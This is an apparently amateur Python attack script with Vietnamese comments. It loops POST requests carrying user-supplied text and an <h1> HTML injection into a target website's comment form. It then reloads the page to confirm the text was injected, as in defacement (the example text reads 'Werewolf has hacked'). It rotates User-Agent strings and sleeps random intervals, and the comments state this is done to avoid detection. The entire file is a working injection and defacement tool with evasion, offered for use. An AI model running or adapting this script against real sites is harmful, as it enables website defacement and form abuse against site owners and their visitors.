import requests
import time
import random
import sys
import os

# "Chỉ đường" để Python tìm thấy các file trong thư mục Core
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

def start_attack():
    target_url = sys.argv[1] if len(sys.argv) > 1 else input("Nhập URL: ")
    
    # 1. Nhập văn bản bạn muốn "tiêm" vào hiển thị
    a = input("\n[?] Nhập văn bản muốn hiển thị (VD: Werewolf đã hack): ")
    
    user_agents = [
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0"
    ]

    lan_thu = 0
    while True:
        lan_thu += 1
        headers = {'User-Agent': random.choice(user_agents)}
        print(f"\n--- Lần quét & tiêm thứ {lan_thu} ---")

        try:
            # 2. Thực hiện tiêm (Injection)
            # Giả lập gửi form chứa mã muốn hiển thị
            payload = {"comment": a, "user": "Anonymous", "content": f"<h1>{a}</h1>"}
            requests.post(target_url, data=payload, headers=headers, timeout=10)

            # 3. KIỂM TRA HTML (Verify)
            # Tải lại trang web để "soi" xem chữ của mình đã lọt vào chưa
            check_web = requests.get(target_url, headers=headers, timeout=10)
            html_content = check_web.text

            if a in html_content:
                print(f"\n[🔥] THÀNH CÔNG! Đã tìm thấy văn bản '{a}' trong mã nguồn HTML.")
                # Tìm và in ra một đoạn code xung quanh để xác nhận
                vi_tri = html_content.find(a)
                print(f"[🔍] Đoạn code ghi nhận: ...{html_content[vi_tri-30:vi_tri+30]}...")
                break # Dừng vòng lặp khi đã tiêm thành công
            else:
                print(f"[...] Văn bản '{a}' chưa xuất hiện. Có thể server chưa lag hoặc đã lọc mã.")

            # 4. Độ run (Random Delay) như bạn đã nói trong video
            delay = random.uniform(2, 5)
            print(f"[⌛] Nghỉ {delay:.2f}s để tránh bị phát hiện...")
            time.sleep(delay)

        except Exception as e:
            print(f"[!] Lỗi kết nối: {e}")
            time.sleep(5)

if __name__ == "__main__":
    start_attack()
    
